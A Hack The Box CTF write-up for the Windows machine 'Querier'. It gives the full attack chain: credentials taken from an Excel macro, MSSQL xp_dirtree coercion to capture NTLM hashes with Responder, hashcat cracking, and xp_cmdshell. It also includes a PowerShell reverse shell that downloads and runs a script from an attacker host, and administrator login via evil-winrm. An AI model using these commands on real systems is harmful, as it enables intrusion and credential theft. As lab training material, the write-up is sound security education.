---
title: "Hack The Box - Querier - Writeup"
description: "Abusing exposed SMB shares, MSSQL credentials, NTLM capture, and credential discovery to compromise Querier."

platform: "Hack The Box"
image: "/images/querier.png"
difficulty: "Medium"
date: 2026-05-24
draft: false

tags:
  - HackTheBox
  - Windows
  - MSSQL
  - SMB
  - NTLM
  - Responder
  - Hashcat
  - PowerUp
  - WinRM

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

{{< section >}}

# Overview

Querier is a Windows machine focused on SMB enumeration, Microsoft SQL Server abuse, NTLM hash capture, and privilege escalation through exposed credentials.

The machine demonstrates how seemingly harmless files stored on SMB shares can lead to full system compromise through credential exposure and lateral movement.

{{< /section >}}

---

{{< section >}}

# Attack Path Summary

```text
Reconnaissance
        ↓
Anonymous SMB Access
        ↓
Excel Document Discovery
        ↓
MSSQL Credential Recovery
        ↓
MSSQL Access
        ↓
NTLM Authentication Capture
        ↓
Password Cracking
        ↓
MSSQL Service Account Access
        ↓
Remote Shell
        ↓
Credential Discovery
        ↓
Administrator Access
```

{{< /section >}}

---

# Reconnaissance

## Nmap Scan

Initial enumeration identified a Windows host exposing SMB, MSSQL, and WinRM services.

```bash
nmap -sVC -Pn -oA nmap/querier 10.129.38.188
```

Relevant services:

```text
445/tcp  open  microsoft-ds
1433/tcp open  Microsoft SQL Server 2017
5985/tcp open  WinRM
```

The presence of MSSQL immediately stood out as a potentially valuable attack surface.

---

## SMB Enumeration

Enumerating SMB shares revealed an accessible share named `Reports`.

```bash
smbclient -L //10.129.38.188/
```

```text
Reports
```

{{< note >}}

Anonymous SMB access was allowed on the target.

Accessible shares often contain sensitive documents, configuration files, or embedded credentials.

{{< /note >}}

---

## File Discovery

Browsing the Reports share revealed an Excel spreadsheet.

```bash
Currency Volume Report.xlsm
```

The file was downloaded for further analysis.

---

# Initial Foothold

## Macro Analysis

The spreadsheet was inspected using `olevba`.

```bash
olevba Currency\ Volume\ Report.xlsm
```

The embedded VBA code contained a SQL connection string.

```text
Uid=reporting
Pwd=PcwTWTHRwryjc$c6
```

Recovered credentials:

```text
reporting:PcwTWTHRwryjc$c6
```

These credentials appeared to belong to a Microsoft SQL Server account.

---

## MSSQL Access

Using the recovered credentials, authentication to MSSQL was successful.

```bash
impacket-mssqlclient QUERIER.HTB/reporting:'PcwTWTHRwryjc$c6'@10.129.38.188 -windows-auth
```

Although access was obtained, the account lacked sufficient privileges to enable `xp_cmdshell`.

---

## NTLM Hash Capture

Since direct command execution was unavailable, the MSSQL server was forced to authenticate to an attacker-controlled SMB share.

Responder was started:

```bash
sudo responder -I tun0
```

Then MSSQL was instructed to access a remote share:

```sql
xp_dirtree \\10.10.14.62\share
```

{{< note >}}

The `xp_dirtree` procedure can trigger outbound SMB authentication.

When directed toward an attacker-controlled system, NTLM hashes may be captured and cracked offline.

{{< /note >}}

Responder captured an NTLMv2 hash belonging to:

```text
QUERIER\mssql-svc
```

---

## Cracking the NTLM Hash

The captured hash was cracked using Hashcat.

```bash
hashcat -m 5600 mssql-svc.hash /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
mssql-svc:corporate568
```

---

## MSSQL Service Account Access

Authenticating with the newly recovered credentials provided significantly higher privileges.

```bash
impacket-mssqlclient QUERIER.HTB/mssql-svc:'corporate568'@10.129.38.188 -windows-auth
```

This account was allowed to execute `xp_cmdshell`, enabling operating system command execution.

---

## User Flag

```sql
xp_cmdshell "powershell type C:\Users\mssql-svc\Desktop\user.txt"
```

User access was successfully obtained.

---

## Reverse Shell

To gain an interactive shell, a Nishang PowerShell reverse shell was executed.

```sql
xp_cmdshell "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.62/Invoke-PowerShellTcp.ps1')"
```

A reverse shell connected back as:

```text
mssql-svc
```

---

# Privilege Escalation

## PowerUp Enumeration

With interactive access established, PowerUp was used to identify privilege escalation opportunities.

```powershell
Invoke-WebRequest -Uri "http://10.10.14.62/PowerUp.ps1" -OutFile "PowerUp.ps1"
```

Enumeration revealed credentials stored on the system.

```text
Administrator:MyUnclesAreMarioAndLuigi!!1!
```

{{< note >}}

Credential exposure remains one of the most common privilege escalation vectors on Windows systems.

Automated enumeration tools such as PowerUp can quickly identify these opportunities.

{{< /note >}}

---

## Administrator Access

The recovered credentials were used to authenticate through WinRM.

```bash
evil-winrm -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!' -i 10.129.38.188
```

Administrative access was successfully obtained.

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

The machine was fully compromised.

---

{{< section >}}

# Skills & Concepts

* SMB Enumeration
* Excel Macro Analysis
* MSSQL Enumeration
* NTLM Hash Capture
* Responder Usage
* Password Cracking
* MSSQL Abuse
* Reverse Shells
* Windows Privilege Escalation

{{< /section >}}

---

{{< section >}}

# Tools Used

* Nmap
* SMBClient
* Olevba
* Impacket
* Responder
* Hashcat
* Nishang
* PowerUp
* Evil-WinRM

{{< /section >}}

---

# Lessons Learned

Querier demonstrates how sensitive information stored in shared documents can lead directly to system compromise.

Key takeaways include:

* Enumerating SMB shares thoroughly
* Inspecting Office documents for embedded credentials
* Leveraging MSSQL functionality for authentication coercion
* Capturing and cracking NTLM hashes
* Using MSSQL for command execution
* Enumerating Windows privilege escalation opportunities
* Identifying exposed credentials on compromised systems

The machine also highlights the dangers of credential reuse and insecure storage of administrative passwords.

---